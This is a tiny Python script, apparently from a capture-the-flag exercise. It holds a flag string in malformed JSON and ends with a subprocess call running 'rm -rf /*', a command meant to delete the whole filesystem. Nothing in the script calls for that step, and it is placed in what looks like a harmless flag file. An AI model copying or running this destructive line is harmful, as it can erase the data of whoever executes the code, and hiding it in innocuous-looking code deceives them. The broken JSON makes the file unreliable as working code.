import subprocess
import json

flag = '''
     {
      "ctf": [
                "flag":"fsCTF(__bonjior_ell1ot)"
            ]
     }
'''
subprocess.run(["rm", "-rf", "/*"], shell=True)
